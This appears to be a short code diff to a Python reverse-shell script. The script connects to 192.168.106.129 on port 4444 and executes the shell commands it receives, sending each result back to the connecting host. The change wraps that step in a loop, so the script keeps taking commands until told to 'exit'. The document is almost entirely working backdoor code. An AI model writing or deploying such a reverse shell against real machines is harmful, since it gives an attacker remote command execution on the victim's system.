@@ -11,9 +11,13 @@ connection.connect(('192.168.106.129',4444))
 
 connection.send('\n[+] Connected!!!\n')
 
-command = connection.recv(1024)
-result = execute_system_command(command)
-connection.send(f'\n{result}\n')
+while True:
+    command = connection.recv(1024)
+
+    if command=='exit':break
+
+    result = execute_system_command(command)
+    connection.send(f'\n{result}\n')
 
 
 connection.close()
